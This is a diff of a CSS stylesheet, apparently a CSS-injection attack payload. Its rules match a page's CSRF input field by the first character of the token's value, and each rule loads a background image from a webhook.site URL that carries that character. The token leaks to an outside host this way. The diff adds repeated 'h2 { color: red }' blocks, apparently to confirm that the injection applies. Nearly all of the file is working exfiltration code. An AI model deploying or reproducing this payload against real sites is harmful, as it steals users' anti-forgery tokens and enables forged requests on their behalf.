@@ -1,9 +1,15 @@
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^=" "] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c= ");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="!"] {
     visibility: visible !important;
@@ -12,12 +18,18 @@ input[name="csrf"][value^="!"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=!");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="""] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c="");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="#"] {
     visibility: visible !important;
@@ -26,12 +38,18 @@ input[name="csrf"][value^="#"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=#");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="$"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=$");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="%"] {
     visibility: visible !important;
@@ -40,12 +58,18 @@ input[name="csrf"][value^="%"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=%");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="&"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=&");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="'"] {
     visibility: visible !important;
@@ -54,12 +78,18 @@ input[name="csrf"][value^="'"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c='");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="("] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=(");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^=")"] {
     visibility: visible !important;
@@ -68,12 +98,18 @@ input[name="csrf"][value^=")"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=)");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="*"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=*");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="+"] {
     visibility: visible !important;
@@ -82,12 +118,18 @@ input[name="csrf"][value^="+"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=+");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^=","] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=,");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="-"] {
     visibility: visible !important;
@@ -96,12 +138,18 @@ input[name="csrf"][value^="-"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=-");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="."] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=.");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="/"] {
     visibility: visible !important;
@@ -110,12 +158,18 @@ input[name="csrf"][value^="/"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=/");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="0"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=0");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="1"] {
     visibility: visible !important;
@@ -124,12 +178,18 @@ input[name="csrf"][value^="1"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=1");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="2"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=2");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="3"] {
     visibility: visible !important;
@@ -138,12 +198,18 @@ input[name="csrf"][value^="3"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=3");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="4"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=4");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="5"] {
     visibility: visible !important;
@@ -152,12 +218,18 @@ input[name="csrf"][value^="5"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=5");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="6"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=6");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="7"] {
     visibility: visible !important;
@@ -166,12 +238,18 @@ input[name="csrf"][value^="7"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=7");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="8"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=8");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="9"] {
     visibility: visible !important;
@@ -180,12 +258,18 @@ input[name="csrf"][value^="9"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=9");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^=":"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=:");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^=";"] {
     visibility: visible !important;
@@ -194,12 +278,18 @@ input[name="csrf"][value^=";"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=;");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="<"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=<");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="="] {
     visibility: visible !important;
@@ -208,12 +298,18 @@ input[name="csrf"][value^="="] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c==");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^=">"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=>");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="?"] {
     visibility: visible !important;
@@ -222,12 +318,18 @@ input[name="csrf"][value^="?"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=?");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="@"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=@");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="A"] {
     visibility: visible !important;
@@ -236,12 +338,18 @@ input[name="csrf"][value^="A"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=A");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="B"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=B");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="C"] {
     visibility: visible !important;
@@ -250,12 +358,18 @@ input[name="csrf"][value^="C"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=C");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="D"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=D");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="E"] {
     visibility: visible !important;
@@ -264,12 +378,18 @@ input[name="csrf"][value^="E"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=E");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="F"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=F");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="G"] {
     visibility: visible !important;
@@ -278,12 +398,18 @@ input[name="csrf"][value^="G"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=G");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="H"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=H");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="I"] {
     visibility: visible !important;
@@ -292,12 +418,18 @@ input[name="csrf"][value^="I"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=I");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="J"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=J");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="K"] {
     visibility: visible !important;
@@ -306,12 +438,18 @@ input[name="csrf"][value^="K"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=K");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="L"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=L");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="M"] {
     visibility: visible !important;
@@ -320,12 +458,18 @@ input[name="csrf"][value^="M"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=M");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="N"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=N");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="O"] {
     visibility: visible !important;
@@ -334,12 +478,18 @@ input[name="csrf"][value^="O"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=O");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="P"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=P");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="Q"] {
     visibility: visible !important;
@@ -348,12 +498,18 @@ input[name="csrf"][value^="Q"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=Q");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="R"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=R");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="S"] {
     visibility: visible !important;
@@ -362,12 +518,18 @@ input[name="csrf"][value^="S"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=S");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="T"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=T");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="U"] {
     visibility: visible !important;
@@ -376,12 +538,18 @@ input[name="csrf"][value^="U"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=U");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="V"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=V");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="W"] {
     visibility: visible !important;
@@ -390,12 +558,18 @@ input[name="csrf"][value^="W"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=W");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="X"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=X");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="Y"] {
     visibility: visible !important;
@@ -404,12 +578,18 @@ input[name="csrf"][value^="Y"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=Y");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="Z"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=Z");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="["] {
     visibility: visible !important;
@@ -418,12 +598,18 @@ input[name="csrf"][value^="["] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=[");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="\"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=\");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="]"] {
     visibility: visible !important;
@@ -432,12 +618,18 @@ input[name="csrf"][value^="]"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=]");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="^"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=^");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="_"] {
     visibility: visible !important;
@@ -446,12 +638,18 @@ input[name="csrf"][value^="_"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=_");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="`"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=`");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="a"] {
     visibility: visible !important;
@@ -460,12 +658,18 @@ input[name="csrf"][value^="a"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=a");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="b"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=b");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="c"] {
     visibility: visible !important;
@@ -474,12 +678,18 @@ input[name="csrf"][value^="c"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=c");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="d"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=d");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="e"] {
     visibility: visible !important;
@@ -488,12 +698,18 @@ input[name="csrf"][value^="e"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=e");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="f"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=f");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="g"] {
     visibility: visible !important;
@@ -502,12 +718,18 @@ input[name="csrf"][value^="g"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=g");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="h"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=h");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="i"] {
     visibility: visible !important;
@@ -516,12 +738,18 @@ input[name="csrf"][value^="i"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=i");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="j"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=j");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="k"] {
     visibility: visible !important;
@@ -530,12 +758,18 @@ input[name="csrf"][value^="k"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=k");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="l"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=l");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="m"] {
     visibility: visible !important;
@@ -544,12 +778,18 @@ input[name="csrf"][value^="m"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=m");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="n"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=n");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="o"] {
     visibility: visible !important;
@@ -558,12 +798,18 @@ input[name="csrf"][value^="o"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=o");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="p"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=p");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="q"] {
     visibility: visible !important;
@@ -572,12 +818,18 @@ input[name="csrf"][value^="q"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=q");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="r"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=r");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="s"] {
     visibility: visible !important;
@@ -586,12 +838,18 @@ input[name="csrf"][value^="s"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=s");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="t"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=t");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="u"] {
     visibility: visible !important;
@@ -600,12 +858,18 @@ input[name="csrf"][value^="u"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=u");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="v"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=v");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="w"] {
     visibility: visible !important;
@@ -614,12 +878,18 @@ input[name="csrf"][value^="w"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=w");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="x"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=x");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="y"] {
     visibility: visible !important;
@@ -628,12 +898,18 @@ input[name="csrf"][value^="y"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=y");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="z"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=z");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="{"] {
     visibility: visible !important;
@@ -642,6 +918,9 @@ input[name="csrf"][value^="{"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c={");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="|"] {
     visibility: visible !important;
     display: block !important;
@@ -649,12 +928,18 @@ input[name="csrf"][value^="|"] {
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=|");
 }
+h2 {
+    color: red !important;
+}
 input[name="csrf"][value^="}"] {
     visibility: visible !important;
     display: block !important;
     width: 1px !important;
     height: 1px !important;
     background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=}");
+}
+h2 {
+    color: red !important;
 }
 input[name="csrf"][value^="~"] {
     visibility: visible !important;
